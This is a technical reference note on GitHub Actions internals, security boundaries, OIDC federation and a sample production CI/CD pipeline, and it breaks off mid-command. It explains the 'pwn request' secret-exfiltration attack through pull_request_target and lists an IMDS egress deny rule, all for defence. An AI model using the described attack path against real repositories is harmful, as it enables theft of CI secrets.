---
tags:
  - software-engineering
  - devops
  - ci-cd
  - github-actions
  - security
created: 2026-01-02
updated: 2026-11-13
status: 🟢
level: mid-to-senior
---
# GitHub Actions: Execution Internals, Security & Production Workflows

GitHub Actions is a distributed, event-driven workflow orchestrator that compiles declarative YAML definitions into job-level Directed Acyclic Graphs (DAGs), schedules each job onto an isolated runner VM or Kubernetes pod, and federates ephemeral workload identities via OpenID Connect (OIDC). Related foundations: [[Programming/Software Engineering/DevOps/DevOps Complete Guide|DevOps Complete Guide]], [[Programming/Software Engineering/DevOps/CI-CD|CI/CD]], [[Programming/Software Engineering/DevOps/Pipeline Design|Pipeline Design]], [[Programming/Software Engineering/DevOps/Docker|Docker]], [[Programming/Software Engineering/DevOps/Kubernetes|Kubernetes]], [[Programming/Software Engineering/DevOps/Terraform|Terraform]], [[Programming/Software Engineering/DevOps/Git|Git]].

---

## 1. First-Principles Mechanics & Complete Architecture

### 1.1 Runner Provisioning & Job Execution Lifecycle

Every GitHub Actions workflow compiles into a **job-level DAG** where **every job provisions a brand-new, isolated execution environment** (Hyper-V/Firecracker VMs on GitHub-hosted runners, or ephemeral pods under Actions Runner Controller). Filesystem directories, environment variables, background processes, and Docker daemon layers do **not** persist across jobs; state moves exclusively through scalar string `outputs:`, OCI registries, or the Artifact/Cache HTTP APIs.

```mermaid
flowchart LR
  EV["GitHub Webhook Event"] --> SCH["DAG Scheduler (Queue)"]
  SCH --> VM["Provision Fresh VM / Pod"]
  VM --> PRE["Run Pre Hooks + Checkout"]
  PRE --> STEP["Execute Steps via Runner.Worker"]
  STEP --> POST["Run Post Hooks (Cache / Cleanup)"]
  POST --> DEST["Destroy VM + Upload Logs"]
```

Inside a provisioned runner, the open-source `actions/runner` agent spawns `Runner.Worker` and executes a strict five-phase protocol for every job:

1. **Context Hydration & Token Minting**: The control plane evaluates job-level `if:` predicates, generates a short-lived job `GITHUB_TOKEN` scoped strictly to the declared `permissions:` block, and injects masked `secrets.*` plus read-only `github.*` event JSON payloads into `Runner.Worker`.
2. **`pre:` Hook Execution**: Before the first user-visible `run:` step executes, `Runner.Worker` runs any `runs.pre` lifecycle scripts declared by actions in the job (for example, container login or network egress firewall setup like `step-security/harden-runner`).
3. **Sequential Step Evaluation**: Each `steps:` item executes sequentially inside the same OS filesystem (`GITHUB_WORKSPACE`), mutating shared state across steps solely via well-known file descriptors injected into the environment:
   - **`GITHUB_ENV`**: Appending `KEY=VAL` exports an environment variable into all subsequent steps of the same job.
   - **`GITHUB_PATH`**: Appending a directory path prepends it to `$PATH` for subsequent steps.
   - **`GITHUB_OUTPUT`**: Writing `key=value` populates `${{ steps.<id>.outputs.<key> }}` for downstream steps or job `outputs:`.
   - **`GITHUB_STEP_SUMMARY`**: Appending Markdown renders job summaries directly in the workflow UI.
4. **Expression Pre-Evaluation**: Before spawning `bash -e {0}` or `pwsh`, the runner resolves every `${{ ... }}` expression textually inside the YAML payload. Expressions inside `run:` execute *before* the shell parser runs; expressions inside `env:` bind via `execve` process environment tables.
5. **`post:` Hook Execution & Destruction**: Regardless of step success or cancellation (`post-if: always()`), `Runner.Worker` runs `runs.post` cleanup hooks (uploading `actions/cache` archives, logging out of registries, exporting firewall audit telemetry) before destroying the ephemeral VM.

### 1.2 Event Triggers & Synthetic Ref Semantics

Workflow triggers determine not only *when* a pipeline starts, but *which commit* provides the YAML workflow definition and *what privileges* the minted `GITHUB_TOKEN` holds.

| Trigger Event | Workflow YAML Source | `GITHUB_SHA` Checked Out | `GITHUB_TOKEN` Scope on Fork PR | `secrets.*` Access on Fork PR | Primary Use Case |
|---|---|---|---|---|---|
| **`pull_request`** | Target base branch + PR merge preview (`refs/pull/<n>/merge`) | Synthetic merge commit (`PR HEAD + main`) | **Read-only** | **Denied** (empty except `GITHUB_TOKEN`) | Safe untrusted build, lint, unit, and SAST execution |
| **`pull_request_target`** | **Base branch (`main`)** only | Base branch commit (`main`) unless overridden | **Read/Write** | **Full repo secrets** | Labeling or commenting *without* executing PR code |
| **`merge_group`** | Ephemeral queue ref (`gh-readonly-queue/main/...`) | Speculative merged commit (`main + queued PRs`) | Read/Write (same repo) | Repo secrets | GitHub Merge Queue validation before fast-forward to `main` |
| **`push`** | Commit pushed to branch/tag | Exact pushed commit SHA | Configured `permissions:` | Full repo + matching environment secrets | Mainline CI, artifact publishing, continuous delivery |
| **`workflow_call`** | Called workflow commit/tag/SHA | Caller workflow's `GITHUB_SHA` | Narrowed intersection of caller + callee | Explicit `secrets:` map or `secrets: inherit` | Standardized cross-repo build, test, and deploy templates |
| **`workflow_dispatch`** | Target branch selected in UI/API | Selected branch tip | Configured `permissions:` | Full repo + matching environment secrets | Manual hotfix deploys, backfills, emergency rollbacks |
| **`workflow_run`** | **Default branch (`main`)** only | Default branch (`main`) | Read/Write | Full repo secrets | Privileged post-processing of untrusted `pull_request` artifacts |
| **`schedule`** | **Default branch (`main`)** only | Default branch (`main`) | Configured `permissions:` | Full repo secrets | Nightly dependency scans, cache warming, drift checks |

#### Critical Event Mechanics & Hazards
- **Merge Preview Semantics (`pull_request`)**: When a PR opens against `main`, GitHub computes a temporary merge commit `refs/pull/42/merge`. Workflows execute against that integrated state so tests fail immediately if `main` moved incompatibly. If merge conflicts exist, `pull_request` workflows do not trigger until the author resolves conflicts.
- **Merge Queue (`merge_group`)**: Required branch-protection checks must trigger on **both** `pull_request` and `merge_group` (`types: [checks_requested]`). If a required check omits `merge_group`, queued PRs wait indefinitely in the merge queue until they time out.
- **Typed `workflow_dispatch` Inputs**: Always declare explicit input types (`string`, `choice`, `boolean`, `environment`) instead of free-form text so invalid environments or malformed flags fail schema validation before runner provisioning.
- **`schedule` Drift & Auto-Disable**: Cron triggers run on UTC best-effort queues during `:00`/:30 spikes (often delayed `5–25m` at top-of-hour) and automatically disable after **60 days** of zero repository commits.

### 1.3 Critical Security Boundary: `pull_request` vs `pull_request_target` ("Pwn Request")

A `pull_request_target` workflow executes with **write permissions on the base repository and full access to production `secrets.*`**. If that workflow explicitly checks out the PR author's untrusted commit (`ref: ${{ github.event.pull_request.head.sha }}` or `head.ref`) and invokes package managers, test runners, compilers, or linters (`npm ci`, `pytest`, `go test`, `make`, `cargo build`, ESLint plugins), an attacker's fork PR executes arbitrary code via `package.json` `postinstall`, `conftest.py`, `build.rs`, or `Makefile`, exfiltrating `GITHUB_TOKEN` and cloud/registry secrets.

```mermaid
sequenceDiagram
  participant Attacker as "Fork PR (Malicious code)"
  participant Runner as "pull_request_target (Base + Secrets)"
  Attacker->>Runner: "Triggers workflow with head.sha checkout"
  Runner->>Runner: "Runs npm ci (executes postinstall)"
  Runner-->>Attacker: "Exfiltrates secrets.* & write GITHUB_TOKEN"
```

> [!danger] Hard Security Rule: Split Untrusted Code Execution From Privileged Actions
> **Never** check out PR head refs or run user-submitted build/test commands inside `pull_request_target`. Split privileged PR feedback into two isolated workflows:
> 1. Unprivileged **`pull_request`**: Checks out PR code, runs tests with zero secrets and `contents: read`, and uploads plain inert data (`coverage.json`, `pr_number.txt`) via `actions/upload-artifact`.
> 2. Privileged **`workflow_run`**: Triggers on `completed` on `main`, validates `github.event.workflow_run.event == 'pull_request'` and `conclusion == 'success'`, downloads the artifact strictly as **inert parsed JSON/text** (never executing downloaded scripts or binaries, and never interpolating PR metadata into shells), and posts comments or labels.

### 1.4 DAG Scheduling, Conditional Evaluation, Concurrency & Matrix Strategies

#### Inter-Job Data Passing & `if:` Evaluation Traps
- **DAG Fan-Out / Fan-In**: Jobs without `needs:` start concurrently as independent VMs. A job declaring `needs: [lint, unit]` stays queued until both upstream jobs conclude with `success` or `skipped`? **Correction—this is a classic trap**: if an upstream `needs` job is `skipped` (due to `if:` evaluating false), downstream jobs depending on it **also skip by default** unless their `if:` explicitly handles `always()` or checks `needs.<job>.result != 'failure' && needs.<job>.result != 'cancelled'`.
- **Scalar `outputs:` Security Invariant**: Inter-job `outputs:` accept strings up to 1 MB total per workflow run and are stored in plaintext workflow metadata. **Never** write secrets—or base64/hex/JSON-encoded secrets—into `outputs:`. Transforming a secret defeats GitHub's stdout log masker and leaks credentials into readable API payloads.
- **`if:` Status Functions**: GitHub wraps step/job `if:` expressions without explicit `${{ ... }}` in an implicit `success()` check *unless* you include `always()`, `failure()`, or `cancelled()`. Writing `if: github.ref == 'refs/heads/main'` on a cleanup step still skips when a prior step failed! Use `if: always() && github.ref == 'refs/heads/main'`.

#### Concurrency Groups: PR Cancellation vs Deployment Serialization
GitHub maintains **at most 1 running + 1 pending** workflow run per `concurrency.group`. Any additional queued runs arriving while one is already pending immediately supersede and cancel the older pending run.

```yaml
# Pattern A: Pull Request CI — cancel obsolete commits immediately
concurrency:
  group: pr-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```

```yaml
# Pattern B: Stateful Production Deploy / Terraform Apply — NEVER cancel mid-flight!
concurrency:
  group: deploy-${{ inputs.environment }}-${{ github.workflow }}
  cancel-in-progress: false
```

> [!danger] Mid-Deploy Cancellation Hazard
> Setting `cancel-in-progress: true` on Terraform apply, Helm upgrade, or database migration workflows sends `SIGINT`/`SIGTERM` to an active mutation, leaving orphaned cloud resources, locked DynamoDB/S3 Terraform state locks, and half-applied schema transitions. Always set `cancel-in-progress: false` on `main` delivery and infrastructure jobs so queued runs wait sequentially.

#### Matrix Strategies & Sharded Test Fan-In
Matrix jobs expand a cartesian product of keys (up to 256 jobs per matrix):
- **`fail-fast` Control**: Defaults to `true` (immediately cancels all running/queued sibling matrix jobs upon any single matrix failure). Set **`fail-fast: false`** on cross-OS compatibility matrices (`ubuntu`, `macos`, `windows`) and multi-version runtime tests so every platform's diagnostics report cleanly instead of hiding deterministic failures behind transient timeouts.
- **`max-parallel`**: Throttles simultaneous matrix execution when hitting rate-limited external APIs, finite self-hosted pools, or database connection quotas.
- **Dynamic Monorepo Matrix (`fromJSON`)**: Generate a JSON array in a fast `plan` job (`echo "matrix=$(turbo ... --output=json)" >> "$GITHUB_OUTPUT"`) and consume it downstream via `strategy: matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}` (guard against empty `[]` arrays with `if: needs.plan.outputs.matrix != '[]'`, because GitHub rejects empty matrix runs as workflow syntax failures!).
- **Sharded Playwright / Jest Testing**: Split heavy suites via `--shard=${{ matrix.shard_index }}/${{ matrix.shard_total }}`, upload per-shard blob reports (`actions/upload-artifact` with `retention-days: 1`), and merge via a `needs: [e2e]` job (`npx playwright merge-reports --reporter=html,junit ./all-blob-reports`) to emit unified PR telemetry.

#### Service Containers (`services:`) & Job Containers
`services:` provisions sidecar Docker containers attached to a user-defined Docker bridge network alongside the job:
- **Network Addressing**: Steps running directly on the host VM reach sidecars via `localhost:<mapped_port>` (e.g., `postgres://postgres:postgres@localhost:5432/app`). Steps running inside a job `container:` share the Docker bridge DNS and reach sidecars via `<service_label>:<container_port>` (e.g., `postgres:5432`).
- **Mandatory Health Gating**: Docker marks containers started before Postgres/Redis finish initializing WAL recovery or listening on TCP. Always include `--health-cmd`, `--health-interval`, `--health-timeout`, and `--health-retries` in `options:` so GitHub delays step execution until the health probe passes.

### 1.5 OIDC Keyless Cloud Federation

Static long-lived cloud keys (`AWS_ACCESS_KEY_ID`, GCP service account JSON keys) stored as repository secrets carry permanent blast radius if exfiltrated, lack per-branch cryptographic provenance, and accumulate compliance debt across manual rotation cycles. **OpenID Connect (OIDC)** replaces static secrets with short-lived, cryptographically verifiable JWTs minted per job execution.

```mermaid
sequenceDiagram
  participant GHA as "Runner (id-token: write)"
  participant IDP as "GitHub OIDC Provider"
  participant STS as "Cloud STS / WIF"
  GHA->>IDP: "Request signed JWT (aud=sts.amazonaws.com)"
  IDP-->>GHA: "JWT (sub=repo:org/app:environment:prod)"
  GHA->>STS: "AssumeRoleWithWebIdentity / Exchange JWT"
  STS-->>GHA: "15m Scoped Temporary Credentials"
```

When a job holds `permissions: id-token: write`, `Runner.Worker` injects `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` into the job environment. Cloud auth actions (`aws-actions/configure-aws-credentials`, `google-github-actions/auth`, `azure/login`) exchange that local bearer token for a signed RS256 JWT from `https://token.actions.githubusercontent.com` containing immutable claims:
- **`iss`**: `https://token.actions.githubusercontent.com`
- **`aud`**: Target cloud audience (default `sts.amazonaws.com` on AWS, or `https://iam.googleapis.com/projects/<num>/locations/global/workloadIdentityPools/...` on GCP).
- **`sub`**: Default subject format, e.g., `repo:acme/payments-api:environment:production` (when an `environment:` is attached) or `repo:acme/payments-api:ref:refs/heads/main`.
- **`job_workflow_ref`**: Exact reusable workflow ref (`acme/platform-workflows/.github/workflows/_deploy.yml@refs/tags/v2.1.0`), enabling cloud IAM trust policies to enforce **which central CI template** performed the build/deploy!

> [!warning] OIDC Trust Policy Wildcard Trap
> Using `"StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*" }` or omitting branch/environment qualifiers lets **any** developer in **any** sandbox repository or unreviewed feature branch assume the production IAM role! Always pin exact `StringEquals` on `repo:<org>/<repo>:environment:production` paired with GitHub **Environment protection rules** (required reviewers + protected deployment branches restricted to `main`).

### 1.6 Self-Hosted Runners & Ephemeral ARC Kubernetes Architecture

Persistent self-hosted runners survive across workflow runs, preserving `/tmp`, Docker daemon layers, `~/.aws`, `~/.npmrc`, and process memory. Running untrusted code or multi-tenant repositories on persistent self-hosted runners causes cross-run secret theft and environment corruption.

For private networking, custom GPU/ARM hardware, or high-volume monorepos where GitHub-hosted runners bottleneck, deploy **Actions Runner Controller (ARC)** (`gha-runner-scale-set`) on Kubernetes:
- **Ephemeral Pod-Per-Job Isolation**: The ARC listener polls GitHub's Scale Set API and provisions a dedicated `Runner` pod upon job assignment; once `Runner.Worker` finishes the single job, the pod terminates and its writable overlayfs + ephemeral volumes are destroyed.
- **Rootless Container Builds Without Docker Socket Exposure**: Never mount host `/var/run/docker.sock` into runner pods (granting root-equivalent cluster takeover via container escape). Run a rootless `moby/buildkit:rootless` sidecar container inside the pod or use `containerMode: kubernetes` with `buildkitd` over TCP/Unix socket.
- **Network Isolation**: Restrict ARC runner pods with Kubernetes `NetworkPolicy` blocking egress to cluster control planes (`kube-apiserver`), cloud IMDS (`169.254.169.254/32`), and unrelated production namespaces.

---

## 2. Real-World Use Cases & Decision Matrix

| Engineering Scenario | Recommended GitHub Actions Architecture | Rejected Alternative & Failure Mode | Key Operational Trade-Off |
|---|---|---|---|
| **Public OSS / Fork PR Automated Labeling & Coverage Comments** | Split **`pull_request`** (read-only token, no secrets, upload JSON artifact) + **`workflow_run`** (on `main`, parse inert JSON, post PR comment) | Direct **`pull_request_target`** checking out `head.sha` and running tests | Slightly higher latency (`~15–30s` handoff) in exchange for eliminating fork RCE secret exfiltration |
| **Standardizing CI/CD Across 40 Microservice Repositories** | Central **`workflow_call`** reusable workflows pinned by release tag/SHA + narrow `secrets:` passing | Copy-pasting workflow YAML across 40 repos or granting `secrets: inherit` indiscriminately | Reusable workflows require `permissions:` alignment on caller; prevents drift across 40 teams |
| **Packaging Toolchain Setup (`pnpm`, `uv`, `protoc`) Inside Multiple Jobs** | Local/Org **Composite Action** (`action.yml`) injected inline in caller's VM | Calling a separate **`workflow_call`** job for setup | Composite actions share the caller's VM disk (`0s` extra VM boot), but cannot isolate `GITHUB_TOKEN` scopes |
| **Authenticating CI Deployments to AWS / GCP / Azure** | **OIDC Keyless Federation** (`id-token: write`) scoped to `environment: production` + `job_workflow_ref` | Long-lived IAM user keys (`AWS_ACCESS_KEY_ID`) stored in repo secrets | Zero key rotation overhead and cryptographic branch/environment binding; requires initial IAM trust setup |
| **Docker Layer Caching in Multi-Service Monorepos** | BuildKit **`type=gha,mode=max,scope=<service_name>`** or OCI Registry cache (`type=registry,ref=...`) | Global unscoped `type=gha` or `actions/cache` over `/var/lib/docker` | `scope=<svc>` prevents 10 GB repo LRU thrashing; registry cache scales past 10 GB at network pull cost |
| **High-Volume Monorepo CI Requiring VPC DB Access or Custom GPUs** | **Ephemeral ARC Kubernetes Scale Set** (`minRunners: 0`, rootless BuildKit sidecar, strict `NetworkPolicy`) | Persistent VM self-hosted runners or opening VPC firewall to GitHub IP ranges | Eliminates cross-job state/credential bleed and static firewall maintenance; adds K8s cluster ops burden |

---

## 3. Step-by-Step Production Multi-Workflow Implementation

Below is a complete, production-ready CI/CD architecture for a TypeScript/Node.js + Docker microservice (`acme/orders-api`), enforcing SHA-pinned actions, `step-security/harden-runner`, sharded Playwright E2E merging, reusable BuildKit `type=gha,mode=max` SLSA provenance builds, OIDC keyless AWS + GCP deployments, and automated Dependabot SHA maintenance.

### Repository Layout

```text
.github/
  dependabot.yml
  actions/
    setup-node-pnpm/
      action.yml
  workflows/
    _reusable-build.yml
    ci-cd.yml
infra/
  aws-oidc-trust-policy.json
  gcp-wif-setup.sh
```

### 3.1 Composite Action: `.github/actions/setup-node-pnpm/action.yml`

Encapsulates deterministic Node.js and `pnpm` installation using strict lockfile cache keys (with an optional `allow-fallback-cache` flag disabled on release builds to prevent stale cache poisoning). Every shell step explicitly declares `shell: bash`, which is mandatory inside composite actions.

```yaml
name: "Setup Node and pnpm"
description: "Installs pinned Node.js and pnpm with strict lockfile caching"

inputs:
  node-version:
    description: "Node.js version or path to .nvmrc"
    required: false
    default: "22"
  frozen-lockfile:
    description: "Enforce exact lockfile match via --frozen-lockfile"
    required: false
    default: "true"
  allow-fallback-cache:
    description: "Permit partial restore-keys fallback (disable on release jobs)"
    required: false
    default: "true"

runs:
  using: "composite"
  steps:
    - name: Install pnpm
      uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4

    - name: Setup Node.js
      uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
      with:
        node-version: ${{ inputs.node-version }}

    - name: Resolve pnpm store directory
      id: pnpm-store
      shell: bash
      run: |
        set -euo pipefail
        STORE_DIR="$(pnpm store path --silent)"
        echo "path=${STORE_DIR}" >> "$GITHUB_OUTPUT"

    - name: Restore pnpm store cache (with fallback for PRs)
      if: inputs.allow-fallback-cache == 'true'
      uses: actions/cache@6849a6489940f00c2f30c0fb92c62331d9e3d472 # v4.1.2
      with:
        path: ${{ steps.pnpm-store.outputs.path }}
        key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}
        restore-keys: |
          ${{ runner.os }}-pnpm-

    - name: Restore pnpm store cache (strict exact key for releases)
      if: inputs.allow-fallback-cache != 'true'
      uses: actions/cache@6849a6489940f00c2f30c0fb92c62331d9e3d472 # v4.1.2
      with:
        path: ${{ steps.pnpm-store.outputs.path }}
        key: ${{ runner.os }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}

    - name: Install dependencies
      shell: bash
      env:
        FROZEN: ${{ inputs.frozen-lockfile }}
      run: |
        set -euo pipefail
        if [[ "$FROZEN" == "true" ]]; then
          pnpm install --frozen-lockfile --ignore-scripts
        else
          pnpm install --ignore-scripts
        fi
```

### 3.2 Reusable Build & Attestation Workflow: `.github/workflows/_reusable-build.yml`

Compiles the OCI container once, isolates BuildKit GHA cache per `service_name` using `mode=max` (caching all intermediate builder stages), emits SBOM + SLSA provenance, generates a formal GitHub Artifact Attestation (`actions/attest-build-provenance`), and returns the immutable `@sha256:` image reference.

```yaml
name: Reusable OCI Build & Attest

on:
  workflow_call:
    inputs:
      service_name:
        description: "Service identifier used for image name and BuildKit cache scope"
        required: true
        type: string
      dockerfile_path:
        description: "Path to Dockerfile"
        required: true
        type: string
      context_path:
        description: "Docker build context directory"
        required: false
        type: string
        default: "."
      push_image:
        description: "Push image and sign provenance (false for PR validation)"
        required: false
        type: boolean
        default: false
    outputs:
      image_digest_ref:
        description: "Immutable OCI image reference (registry/repo/svc@sha256:...)"
        value: ${{ jobs.build.outputs.image_digest_ref }}
      image_digest:
        description: "Raw sha256:... digest"
        value: ${{ jobs.build.outputs.image_digest }}

permissions: {}

jobs:
  build:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      image_digest_ref: ${{ steps.emit.outputs.image_digest_ref }}
      image_digest: ${{ steps.push.outputs.digest }}
    steps:
      - name: Harden Runner egress telemetry
        uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
        with:
          egress-policy: audit

      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226 # v3.3.0

      - name: Log in to GitHub Container Registry
        if: inputs.push_image
        uses: docker/login-action@9780b0c442fcf1117ad29c078b54714114f5b9b4 # v3.3.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and optionally push OCI image
        id: push
        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
        with:
          context: ${{ inputs.context_path }}
          file: ${{ inputs.dockerfile_path }}
          push: ${{ inputs.push_image }}
          tags: ghcr.io/${{ github.repository }}/${{ inputs.service_name }}:sha-${{ github.sha }}
          provenance: mode=max
          sbom: true
          cache-from: type=gha,scope=${{ inputs.service_name }}
          cache-to: type=gha,mode=max,scope=${{ inputs.service_name }}

      - name: Attest OCI build provenance via Sigstore OIDC
        if: inputs.push_image
        uses: actions/attest-build-provenance@897ed5eab6ed058a474202017ada7f40bfa52940 # v1.4.3
        with:
          subject-name: ghcr.io/${{ github.repository }}/${{ inputs.service_name }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

      - name: Emit immutable digest reference
        id: emit
        env:
          IMAGE_BASE: ghcr.io/${{ github.repository }}/${{ inputs.service_name }}
          DIGEST: ${{ steps.push.outputs.digest }}
        run: |
          set -euo pipefail
          {
            echo "image_digest_ref=${IMAGE_BASE}@${DIGEST}"
          } >> "$GITHUB_OUTPUT"
```

### 3.3 Main Delivery Pipeline: `.github/workflows/ci-cd.yml`

Integrates `pull_request`, `merge_group`, `push` (`main`), and `workflow_dispatch`, safely handles concurrency (`cancel-in-progress: true` only on non-main branches), runs Tier-0 static checks, runs a 4-shard Playwright matrix + report merger, invokes `_reusable-build.yml`, and deploys via OIDC to AWS ECS and GCP Cloud Run.

```yaml
name: Orders API CI/CD

on:
  pull_request:
    branches: [main]
  merge_group:
    types: [checks_requested]
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      deploy_env:
        description: "Target deployment environment"
        required: true
        type: choice
        default: "staging"
        options:
          - staging
          - production
      dry_run:
        description: "Run build and verification without cloud rollout"
        required: false
        type: boolean
        default: false

permissions: {}

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' && github.event_name != 'workflow_dispatch' }}

jobs:
  lint-and-typecheck:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - name: Harden Runner egress policy
        uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            objects.githubusercontent.com:443
            registry.npmjs.org:443

      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Validate PR title safely via env binding
        if: github.event_name == 'pull_request'
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ ! "$PR_TITLE" =~ ^(feat|fix|chore|docs|refactor|test|ci)(\([a-z0-9-]+\))?!?: ]]; then
            echo "ERROR: PR title must follow Conventional Commits." >&2
            exit 1
          fi

      - name: Setup Node & pnpm
        uses: ./.github/actions/setup-node-pnpm
        with:
          allow-fallback-cache: ${{ github.ref != 'refs/heads/main' }}

      - name: Run lint and strict TypeScript check
        run: |
          set -euo pipefail
          pnpm lint
          pnpm typecheck

  unit-tests:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        node_version: ["20", "22"]
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: ./.github/actions/setup-node-pnpm
        with:
          node-version: ${{ matrix.node_version }}
          allow-fallback-cache: ${{ github.ref != 'refs/heads/main' }}

      - name: Execute unit test suite
        run: pnpm test:unit -- --ci

  e2e-sharded:
    needs: [lint-and-typecheck]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    services:
      postgres:
        image: postgres:16.4-alpine
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: app_test_password
          POSTGRES_DB: orders_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd="pg_isready -U app -d orders_test"
          --health-interval=5s
          --health-timeout=5s
          --health-retries=10
    strategy:
      fail-fast: false
      matrix:
        shard_index: [1, 2, 3, 4]
    steps:
      - uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: ./.github/actions/setup-node-pnpm
        with:
          allow-fallback-cache: ${{ github.ref != 'refs/heads/main' }}

      - name: Install Playwright Chromium browser
        run: pnpm exec playwright install chromium --with-deps

      - name: Run sharded Playwright tests
        env:
          DATABASE_URL: postgres://app:app_test_password@localhost:5432/orders_test
          CI: "true"
        run: pnpm exec playwright test --shard=${{ matrix.shard_index }}/4

      - name: Upload Playwright blob report
        if: always()
        uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
        with:
          name: blob-report-${{ matrix.shard_index }}
          path: blob-report/
          retention-days: 1

  merge-e2e-reports:
    if: always() && needs.e2e-sharded.result != 'skipped' && needs.e2e-sharded.result != 'cancelled'
    needs: [e2e-sharded]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: ./.github/actions/setup-node-pnpm
      - name: Download all shard blob reports
        uses: actions/download-artifact@fa0a91b85d4f404e444e00e0059713726501c1f4 # v4.1.8
        with:
          pattern: blob-report-*
          path: all-blob-reports
          merge-multiple: true
      - name: Merge Playwright HTML and JUnit reports
        run: pnpm exec playwright merge-reports --reporter=html,junit ./all-blob-reports
      - name: Upload unified Playwright report
        uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882 # v4.4.3
        with:
          name: playwright-unified-report
          path: playwright-report/
          retention-days: 7

  build-oci:
    needs: [lint-and-typecheck, unit-tests, e2e-sharded]
    uses: ./.github/workflows/_reusable-build.yml
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    with:
      service_name: orders-api
      dockerfile_path: Dockerfile
      push_image: ${{ github.ref == 'refs/heads/main' && (github.event_name == 'push' || github.event_name == 'workflow_dispatch') }}

  deploy-aws-prod:
    if: |
      github.ref == 'refs/heads/main' &&
      (github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.deploy_env == 'production' && !inputs.dry_run))
    needs: [build-oci]
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://orders.acme.internal
    concurrency:
      group: deploy-aws-production
      cancel-in-progress: false
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Harden Runner egress policy
        uses: step-security/harden-runner@f808768d1510423e83855289c910610ca9b43176 # v2.17.0
        with:
          egress-policy: block
          allowed-endpoints: >
            sts.us-east-1.amazonaws.com:443
            ecs.us-east-1.amazonaws.com:443
            ghcr.io:443

      - name: Assume AWS IAM role via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-orders-api-prod-deploy
          aws-region: us-east-1

      - name: Update ECS task definition with immutable digest
        env:
          IMAGE_DIGEST_REF: ${{ needs.build-oci.outputs.image_digest_ref }}
        run: |
          set -euo pipefail
          echo "Deploying immutable artifact: ${IMAGE_DIGEST_REF}"
          TASK_DEF=$(aws ecs describe-task-definition --task-definition orders-api-prod --query 'taskDefinition')
          NEW_TASK_DEF=$(jq --arg IMG "$IMAGE_DIGEST_REF" \
            'del(.taskDefinitionArn, .revision, .status, .requiresAttributes, .compatibilities, .registeredAt, .registeredBy)
             | .containerDefinitions[0].image = $IMG' <<< "$TASK_DEF")
          NEW_ARN=$(aws ecs register-task-definition --cli-input-json "$NEW_TASK_DEF" --query 'taskDefinition.taskDefinitionArn' --output text)
          aws ecs update-service --cluster prod-core --service orders-api --task-definition "$NEW_ARN"
          aws ecs wait services-stable --cluster prod-core --services orders-api

  deploy-gcp-staging:
    if: |
      github.ref == 'refs/heads/main' &&
      (github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.deploy_env == 'staging' && !inputs.dry_run))
    needs: [build-oci]
    runs-on: ubuntu-24.04
    environment:
      name: staging
      url: https://staging-orders.acme.internal
    concurrency:
      group: deploy-gcp-staging
      cancel-in-progress: false
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Authenticate to GCP via Workload Identity Federation
        uses: google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2 # v2.1.10
        with:
          workload_identity_provider: projects/987654321000/locations/global/workloadIdentityPools/github-actions/providers/github-oidc
          service_account: gha-orders-deployer@acme-staging.iam.gserviceaccount.com

      - name: Rollout Cloud Run service using immutable digest
        env:
          IMAGE_DIGEST_REF: ${{ needs.build-oci.outputs.image_digest_ref }}
        run: |
          set -euo pipefail
          gcloud run deploy orders-api \
            --region=us-central1 \
